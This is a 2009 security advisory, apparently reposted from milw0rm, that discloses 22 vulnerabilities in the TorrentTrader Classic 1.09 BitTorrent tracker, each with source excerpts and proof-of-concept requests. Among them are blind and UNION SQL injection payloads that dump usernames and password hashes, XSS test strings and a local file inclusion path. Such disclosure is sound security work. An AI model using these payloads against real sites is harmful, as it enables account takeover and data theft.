<html><head><title>TorrentTrader Classic 1.09 Multiple Remote Vulnerabilities</title></head><pre>[waraxe-2009-SA#074] - Multiple Vulnerabilities in TorrentTrader Classic 1.09
===============================================================================

Author: Janek Vind &quot;waraxe&quot;
Date: 15. June 2009
Location: Estonia, Tartu
Web: http://www.waraxe.us/advisory-74.html


Description of vulnerable software:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

TorrentTrader is a feature packed and highly customisable PHP/MySQL Based
BitTorrent tracker. Featuring integrated forums and plenty of administration
options. Please visit www.torrenttrader.org for the support forums.

http://sourceforge.net/projects/torrenttrader 


List of found vulnerabilities
===============================================================================

1. Sql Injection vulnerability in &quot;account-inbox.php&quot;
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. unsanitized user submitted parameter &quot;origmsg&quot; is used in sql query
Preconditions:
  1. attacker must be logged in as valid user

Test:

http://localhost/torrenttrader109/account-inbox.php?msg=1&amp;receiver=waraxe&amp;origmsg=foobar&amp;delete=yes

Result: &quot;MYSQL Error has occurred!&quot;

-----------------------------[source code start]-------------------------------
if ($msg) {
  $msg = trim($msg);

  $res = mysql_query(&quot;SELECT id, acceptpms, notifs, email, UNIX_TIMESTAMP(last_access) as la FROM users WHERE username=&quot;.sqlesc($receiver).&quot;&quot;);
  $user = mysql_fetch_assoc($res);
  if (!$user)
    $message = &quot;Username not found.&quot;;
...

    if ($origmsg &amp;&amp; $delete == &quot;yes&quot;)
       mysql_query(&quot;DELETE FROM messages WHERE id=$origmsg&quot;) or sqlerr();
-----------------------------[source code end]---------------------------------


2. Weak password generation algorithm in &quot;account-recover.php&quot;
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. generated password is weak and can be easily bruteforced
Preconditions:
  1. attacker must know email address associated with target's account

Torrenttrader contains password reseting functionality:

http://localhost/torrenttrader109/account-recover.php

Anyone can initiate password reset, only condition is, that target's email
address must be know. Torrenttrader will check email address and after successful
validation new, temporal password will be generated and sent to that email address.
Specific autogenerated password appears to be random number between 10000 and 50000,
so basically there can be only 40000 possible temporal passwords. It's easy to
write bruteforce script, which will try all possible password combinations.
This process can take couple of hours or more, but eventually the password will
be guessed and target account becomes compromised.

-----------------------------[source code start]-------------------------------
if ($HTTP_SERVER_VARS[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) {
  $email = trim($_POST[&quot;email&quot;]);
  if (!validemail($email)) {
	$msg = &quot;&quot; . NOT_VAILD_EMAIL . &quot;&quot;;
	$kind = &quot;Error&quot;;
  }
  else {
	  $res = mysql_query(&quot;SELECT * FROM users WHERE email=&quot; . sqlesc($email) . &quot; LIMIT 1&quot;);
	  $arr = mysql_fetch_assoc($res);

	  if (!$arr) {
	    $msg = &quot;&quot; . EMAIL_INVALID . &quot;&quot;;
	    $kind = &quot;Error&quot;;
	  }
...
	  if ($arr) {
	  	$newpassword = rand(10000, 50000);
	  	$md5pass = md5($newpassword);
-----------------------------[source code end]---------------------------------


3. Unauthorized database backup vulnerability in &quot;backup-database.php&quot;
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. missing access control
Preconditions:
  1. mysqldump utility must be available
  2. gzip utility must be available
  3. target directory must be writable
  4. database name must be known in order to successfully guess archive filename

Test:

http://localhost/torrenttrader109/backup-database.php

Resulting message: &quot;Database backup successful, entry inserted into database.&quot;

-----------------------------[source code start]-------------------------------
system(sprintf(    
  'mysqldump --opt -h %s -u %s -p%s %s | gzip &gt; %s/%s/%s-%s-%s-%s.gz',                                    
  $host,
  $user,
  $pass,
  $db,
  getenv('DOCUMENT_ROOT'),
  $backupdir,
  $db,
  $day,
  $month,
  $year
 )); 
-----------------------------[source code end]---------------------------------

Attacker is able to create database backup and resulting &quot;gz&quot; archive's
filename can be guessed, if attacker knows database name. This file is also
directly downloadable from website. Example download URI:

http://localhost/torrenttrader109/backups/torrenttrader109-10-06-2009.gz

As result information leakage exists. For example, attacker can fetch admin
credentials from backed up database.


4. Sql Injection vulnerability in &quot;browse.php&quot;
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. uninitialized variable &quot;wherecatin&quot; is used in sql query
Preconditions:
  1. none

Test:

http://localhost/torrenttrader109/browse.php?wherecatin=waraxe

Result:

Unknown column 'waraxe' in 'where clause'

-----------------------------[source code start]-------------------------------
if (count($wherecatina) &gt; 1)
$wherecatin = implode(&quot;,&quot;,$wherecatina);
elseif (count($wherecatina) == 1)
$wherea[] = &quot;category = $wherecatina[0]&quot;;
...
if ($wherecatin)
$where .= ($where ? &quot; AND &quot; : &quot;&quot;) . &quot;category IN(&quot; . $wherecatin . &quot;)&quot;;

if ($where != &quot;&quot;)
$where = &quot;WHERE $where&quot;;

$res = mysql_query(&quot;SELECT COUNT(*) FROM torrents $where&quot;) or die(mysql_error());
-----------------------------[source code end]---------------------------------

This specific sql injection vulneraility can be exploited using blind attack
methods. If there is one or more active torrents in database, then usable is
attack pattern below:

http://localhost/torrenttrader109/browse.php?wherecatin=0)+OR+IF(LENGTH(@@version)&gt;1,1,2)=(SELECT+1

and we see found torrents.

http://localhost/torrenttrader109/browse.php?wherecatin=0)+OR+IF(LENGTH(@@version)&gt;50,1,2)=(SELECT+1

&quot;No torrents were found based on your search criteria.&quot;

In this way attacker is able to ask boolean questions from database and retrieve
needed information bit by bit - example of classical blind sql injection.

If there is no active torrents in database, then induced sql errors method can be used.

http://localhost/torrenttrader109/browse.php?wherecatin=0)+OR+IF(LENGTH(@@version)&gt;1,(SELECT 1 UNION ALL SELECT 1),2)=(SELECT+1

&quot;Subquery returns more than 1 row&quot;

http://localhost/torrenttrader109/browse.php?wherecatin=0)+OR+IF(LENGTH(@@version)&gt;50,(SELECT 1 UNION ALL SELECT 1),2)=(SELECT+1

&quot;No torrents were found based on your search criteria.&quot;


5. Information leakage in &quot;check.php&quot;
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. missing access control
Preconditions:
  1. none

Test:

http://localhost/torrenttrader109/check.php

This script is originally meant to be used by installer and lately by admins.
Because of lacking access control attacker is able to use it for gathering some
useful information about target system - full path to webroot, file and directory
permissions of specific files, couple of php settings.

6. Sql Injection vulnerability in &quot;delreq.php&quot;
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. unsanitized user submitted parameter &quot;categ&quot; is used in sql query
Preconditions:
  1. attacker must have at least super moderator privileges (user class &gt; 3)
Comments:
  1. very easy to exploit

Test:

http://localhost/torrenttrader109/delreq.php?categ=waraxe

Result:

You have an error in your SQL syntax; check the manual that corresponds to your
MySQL server version for the right syntax to use near
'waraxe order by requests.request LIMIT 0,50' at line 1

Test 2:

http://localhost/torrenttrader109/delreq.php?categ=UNION+ALL+SELECT+1,2,3,4,5,username,password,email+FROM+users--+

and we can see all usernames, password hashes and emails from database.


7. Sql Injection vulnerability in &quot;index.php&quot;
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. unsanitized user submitted parameter &quot;choice&quot; is used in sql query
Preconditions:
  1. attacker must be logged in as valid user
  2. there must exist at least one poll

Testing needs custom written html form:
-------------------------------------------------------------------------------
&lt;html&gt;&lt;body&gt;&lt;center&gt;
&lt;form action=&quot;http://localhost/torrenttrader109/index.php&quot; method=&quot;post&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;choice&quot; value=&quot;waraxe&quot;&gt;
&lt;input type=&quot;submit&quot; value=&quot;Test!&quot;&gt;
&lt;/form&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;
-------------------------------------------------------------------------------

Result: &quot;MYSQL Error has occurred!&quot;

-----------------------------[source code start]-------------------------------
if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;)
{
  $choice = $_POST[&quot;choice&quot;];
  if ($CURUSER &amp;&amp; $choice != &quot;&quot; &amp;&amp; $choice &lt; 256 &amp;&amp; $choice == floor($choice))
  {
    $res = mysql_query(&quot;SELECT * FROM polls ORDER BY added DESC LIMIT 1&quot;) or sqlerr();
    $arr = mysql_fetch_assoc($res) or die(&quot;No poll&quot;);
    $pollid = $arr[&quot;id&quot;];
    $userid = $CURUSER[&quot;id&quot;];
    $res = mysql_query(&quot;SELECT * FROM pollanswers WHERE pollid=$pollid &amp;&amp; userid=$userid&quot;) or sqlerr();
    $arr = mysql_fetch_assoc($res);
    if ($arr) die(&quot;Dupe vote&quot;);
    mysql_query(&quot;INSERT INTO pollanswers VALUES(0, $pollid, $userid, $choice)&quot;) or sqlerr();
-----------------------------[source code end]---------------------------------


8. Sql Injection vulnerability in &quot;modrules.php&quot;
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. unsanitized user submitted parameter &quot;id&quot; is used in sql query
Preconditions:
  1. attacker must have at least moderator privileges

Testing needs custom written html form:
-------------------------------------------------------------------------------
&lt;html&gt;&lt;body&gt;&lt;center&gt;
&lt;form action=&quot;http://localhost/torrenttrader109/modrules.php?act=edited&quot; method=&quot;post&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;title&quot; value=&quot;test&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;text&quot; value=&quot;test&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;public&quot; value=&quot;yes&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;class&quot; value=&quot;0&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;1&quot;&gt;
&lt;input type=&quot;submit&quot; value=&quot;Test!&quot;&gt;
&lt;/form&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;
-------------------------------------------------------------------------------

Test result: &quot;MYSQL Error has occurred!&quot;

-----------------------------[source code start]-------------------------------
elseif ($_GET[&quot;act&quot;]==&quot;edited&quot;){
$id = $_POST[&quot;id&quot;];
$title = sqlesc($_POST[&quot;title&quot;]);
$text = sqlesc($_POST[&quot;text&quot;]);
$public = sqlesc($_POST[&quot;public&quot;]);
$class = sqlesc($_POST[&quot;class&quot;]);
mysql_query(&quot;update rules set title=$title, text=$text, public=$public,
  class=$class where id=$id&quot;) or sqlerr(__FILE__,__LINE__);
-----------------------------[source code end]---------------------------------
  

9. Information leakage in &quot;phpinfo.php&quot;
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. missing access control
Preconditions:
  1. none

Test:

http://localhost/torrenttrader109/phpinfo.php

-----------------------------[source code start]-------------------------------
&lt;?php
phpinfo();
?&gt;
-----------------------------[source code end]---------------------------------

This script can be used by attacker to obtain information from php function
phpinfo(). Access to such script must be limited to admins, but currently there
is not any access control at all.


10. Sql Injection vulnerabilities in &quot;report.php&quot;
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. unsanitized user submitted parameter &quot;user&quot; is used in sql query
  2. unsanitized user submitted parameter &quot;torrent&quot; is used in sql query
  3. unsanitized user submitted parameter &quot;forumid&quot; is used in sql query
  4. unsanitized user submitted parameter &quot;forumpost&quot; is used in sql query
Preconditions:
  1. attacker must be logged in as valid user

Two proof-of-concept tests below are using parameter &quot;user&quot;.

Test 1 needs custom written html form:
-------------------------------------------------------------------------------
&lt;html&gt;&lt;body&gt;&lt;center&gt;
&lt;form action=&quot;http://localhost/torrenttrader109/report.php&quot; method=&quot;post&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;reason&quot; value=&quot;test&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;user&quot; value=&quot;0 UNION SELECT IF(LENGTH(@@version)&gt;1,(SELECT 1 UNION ALL SELECT 1),1)-- &quot;&gt;
&lt;input type=&quot;submit&quot; value=&quot;Test!&quot;&gt;
&lt;/form&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;
-------------------------------------------------------------------------------

Test result: &quot;MYSQL Error has occurred!&quot;

Test 2 needs custom written html form:
-----------------------------[source code start]-------------------------------
&lt;html&gt;&lt;body&gt;&lt;center&gt;
&lt;form action=&quot;http://localhost/torrenttrader109/report.php&quot; method=&quot;post&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;reason&quot; value=&quot;test&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;user&quot; value=&quot;0 UNION SELECT IF(LENGTH(@@version)&gt;50,(SELECT 1 UNION ALL SELECT 1),1)-- &quot;&gt;
&lt;input type=&quot;submit&quot; value=&quot;Test!&quot;&gt;
&lt;/form&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;
-----------------------------[source code end]---------------------------------
  
Test result: &quot;You have already reported user ...&quot;

It's classical blind sql injection exploitation method and allows attacker to
fetch information from database bit by bit by asking boolean questions.

Other three sql injection vulnerabilities in &quot;report.php&quot; involve user submitted
parameters &quot;torrent&quot;, &quot;forumid&quot; and &quot;forumpost&quot; and exploitation can be done in
similar way as seen above.


11. Sql Injection vulnerability in &quot;take-deletepm.php&quot;
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. unsanitized user submitted parameter &quot;delmp&quot; is used in sql query
Preconditions:
  1. attacker must have admin privileges

-----------------------------[source code start]-------------------------------
if(isset($_POST[&quot;delmp&quot;])) {
	$do=&quot;DELETE FROM messages WHERE id IN (&quot; . implode(&quot;, &quot;, $_POST[delmp]) . &quot;)&quot;;
	$res=mysql_query($do)
-----------------------------[source code end]---------------------------------


12. Sql Injection vulnerability in &quot;takedelreport.php&quot;
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. unsanitized user submitted parameter &quot;delreport&quot; is used in sql query
Preconditions:
  1. attacker must have at least moderator privileges

-----------------------------[source code start]-------------------------------
jmodonly();

$res = mysql_query (&quot;SELECT id FROM reports WHERE dealtwith=0 
  AND id IN (&quot; . implode(&quot;, &quot;, $_POST[delreport]) . &quot;)&quot;);
-----------------------------[source code end]---------------------------------


13. Sql Injection vulnerability in &quot;takedelreq.php&quot;
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. unsanitized user submitted parameter &quot;delreq&quot; is used in sql query
Preconditions:
  1. attacker must be logged in as valid user

-----------------------------[source code start]-------------------------------
if (get_user_class() &gt; UC_JMODERATOR){
...
$do=&quot;DELETE FROM requests WHERE id IN (&quot; . implode(&quot;, &quot;, $_POST[delreq]) . &quot;)&quot;;
$do2=&quot;DELETE FROM addedrequests WHERE requestid IN (&quot; . implode(&quot;, &quot;, $_POST[delreq]) . &quot;)&quot;;
$res2=mysql_query($do2);
$res=mysql_query($do);
...
} else {
foreach ($_POST[delreq] as $del_req){
$delete_ok = checkRequestOwnership($CURUSER[id],$del_req);
if ($delete_ok){
$do=&quot;DELETE FROM requests WHERE id IN ($del_req)&quot;;
$do2=&quot;DELETE FROM addedrequests WHERE requestid IN ($del_req)&quot;;
...
function checkRequestOwnership ($user, $delete_req){
$query = mysql_query(&quot;SELECT * FROM requests WHERE userid=$user AND id = $delete_req&quot;) or sqlerr();
-----------------------------[source code end]---------------------------------



14. Sql Injection vulnerability in &quot;takestaffmess.php&quot;
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. unsanitized user submitted parameter &quot;clases&quot; is used in sql query
Preconditions:
  1. attacker must have admin privileges

-----------------------------[source code start]-------------------------------
adminonly();
...
$updateset = $_POST['clases'];

$query = mysql_query(&quot;SELECT id FROM users WHERE class IN (&quot;.implode(&quot;,&quot;, $updateset).&quot;)&quot;);
-----------------------------[source code end]---------------------------------


15. Sql Injection vulnerability in &quot;takewarndisable.php&quot;
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. unsanitized user submitted parameter &quot;warndisable&quot; is used in sql query
Preconditions:
  1. attacker must have at least moderator privileges

-----------------------------[source code start]-------------------------------
jmodonly();
...
if ($disable != '') {
$do=&quot;UPDATE users SET enabled='no' WHERE id IN (&quot; . implode(&quot;, &quot;, $_POST['warndisable']) . &quot;)&quot;;
$res=mysql_query($do);
}

if ($enable != '') {
$do = &quot;UPDATE users SET enabled='yes' WHERE id IN (&quot; . implode(&quot;, &quot;, $_POST['warndisable']) . &quot;)&quot;;
$res = mysql_query($do);
}
-----------------------------[source code end]---------------------------------


16. Sql Injection vulnerability in &quot;today.php&quot;
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. uninitialized variable &quot;limit&quot; is used in sql query
Preconditions:
  1. none
Comments:
  1. seems hard to exploit

Test:

http://localhost/torrenttrader109/today.php?limit=waraxe

Result: 

&quot;Warning: mysql_num_rows(): supplied argument is not a valid MySQL result
resource in C:\apache_wwwroot\torrenttrader109\today.php on line 21&quot;


17. Sql Injection vulnerability in &quot;torrents-details.php&quot;
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. uninitialized variable &quot;where&quot; is used in sql query
Preconditions:
  1. none

-----------------------------[source code start]-------------------------------
//speed mod
$resSpeed = mysql_query(&quot;SELECT seeders,leechers FROM torrents
WHERE $where visible='yes' and id = $id ORDER BY added DESC LIMIT 15&quot;)
or sqlerr(__FILE__, __LINE__); 
-----------------------------[source code end]---------------------------------

Exploitation is possible using blind sql injection methods.

Test 1:

http://localhost/torrenttrader109/torrents-details.php?id=1&amp;
where=1=IF(LENGTH(@@version)&gt;1,1,(SELECT+1+UNION+ALL+SELECT+1))--+

Result: normal page

Test 2:

http://localhost/torrenttrader109/torrents-details.php?id=1&amp;
where=1=IF(LENGTH(@@version)&gt;50,1,(SELECT+1+UNION+ALL+SELECT+1))--+

Result: &quot;MYSQL Error has occurred!&quot;


18. Sql Injection vulnerability in &quot;admin-delreq.php&quot;
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. uninitialized variable &quot;categ&quot; is used in sql query
Preconditions:
  1. attacker must have at least moderator privileges

-----------------------------[source code start]-------------------------------
jmodonly();
...
$res=mysql_query(&quot;SELECT users.username, requests.filled, requests.filledby,
requests.id, requests.userid, requests.request, requests.added, categories.name
as cat FROM requests inner join categories on requests.cat = categories.id
inner join users on requests.userid = users.id
$categ  order by requests.request $limit&quot;) or print(mysql_error());
-----------------------------[source code end]---------------------------------

Test:

http://localhost/torrenttrader109/admin-delreq.php?categ=waraxe

Result: &quot;You have an error in your SQL syntax; check the manual that corresponds
to your MySQL server version for the right syntax to use
near 'waraxe order by requests.request LIMIT 0,50' at line 1&quot;


19. Persistent XSS in &quot;viewrequests.php&quot;
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. unsanitized user submitted parameters used in response html generation
Preconditions:
  1. attacker must be logged in as valid user

Steps for testing:

a) attacker submits request:

http://localhost/torrenttrader109/requests.php

In &quot;Title&quot; field let's insert some javascript:

testtitle&lt;script&gt;alert(123);&lt;/script&gt;

b) admin will browse requests:

http://localhost/torrenttrader109/viewrequests.php

and previously planted javascript will be executed in admin session context.



20. Persistent XSS in logging funtionality
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. unsanitized user submitted parameters used in response html generation
Preconditions:
  1. attacker must be logged in as valid user

Steps for testing:

a) attacker uploads torrent file:

http://localhost/torrenttrader109/torrents-upload.php

In &quot;Torrent Name&quot; field let's insert some javascript:

testname&lt;script&gt;alert(123);&lt;/script&gt;

Upload is successful: &quot;The torrent has been uploaded successfully!&quot;

b) admin will browse logs:

http://localhost/torrenttrader109/admin.php?act=view_log

and previously planted javascript will be executed in admin session context.


21. Local File Inclusion vulnerability in &quot;backend/admin-functions.php&quot;
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. URI case-insensitivity on Windows platform
Preconditions:
  1. Windows platform
  2. register_globals=on
  3. magic_quotes_gpc=off

-----------------------------[source code start]-------------------------------
if (strpos($_SERVER['REQUEST_URI'], &quot;admin-functions.php&quot;) !== false) die;
require_once(&quot;./themes/&quot; . $GLOBALS['ss_uri'] . &quot;/block.php&quot;);
-----------------------------[source code end]---------------------------------

As we can see from source code snippet above, direct access to script is blocked.
In case of Windows and Apache combination URI handling is case-insensitive.
In other hand &quot;strpos()&quot; function, used for access control, is case-sensitive.
So this script can be directly executed, if we change some characters in script's
filename to uppercase:

http://localhost/torrenttrader109/backend/Admin-functions.php

&quot;Warning: require_once(./themes//block.php) [function.require-once]:
failed to open stream: No such file or directory in
C:\apache_wwwroot\torrenttrader109\backend\admin-functions.php on line 3&quot;

If &quot;register_globals=on&quot; and &quot;magic_quotes_gpc=off&quot;, then LFI is possible:

http://localhost/torrenttrader109/backend/Admin-functions.php?ss_uri=../../banners.txt%00


22. Reflected XSS in multiple scripts
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Examples:

http://localhost/torrenttrader109/themes/default/footer.php?ttversion=&lt;script&gt;alert(123);&lt;/script&gt;
http://localhost/torrenttrader109/themes/default/header.php?SITENAME=&quot;&gt;&lt;script&gt;alert(123);&lt;/script&gt;
http://localhost/torrenttrader109/themes/default/header.php?CURUSER[username]=&lt;script&gt;alert(123);&lt;/script&gt;
http://localhost/torrenttrader109/visitorstoday.php?todayactive=&lt;script&gt;alert(123);&lt;/script&gt;
http://localhost/torrenttrader109/visitorsnow.php?activepeople=&lt;script&gt;alert(123);&lt;/script&gt;
http://localhost/torrenttrader109/faq.php?faq_categ[999][title]=&lt;script&gt;alert(123);&lt;/script&gt;&amp;faq_categ[999][flag]=1
http://localhost/torrenttrader109/torrents-details.php?id=1&amp;keepget=&quot;&gt;&lt;script&gt;alert(123);&lt;/script&gt;


Greetings:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Greets to ToXiC, y3dips, Sm0ke, Heintz, slimjim100, pexli, mge, str0ke,
to all active waraxe.us forum members and to anyone else who know me!


Contact:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

come2waraxe@yahoo.com
Janek Vind &quot;waraxe&quot;

Waraxe forum:  http://www.waraxe.us/forums.html
Personal homepage: http://www.janekvind.com/
---------------------------------- [ EOF ] ------------------------------------

# milw0rm.com [2009-06-15]</pre></html>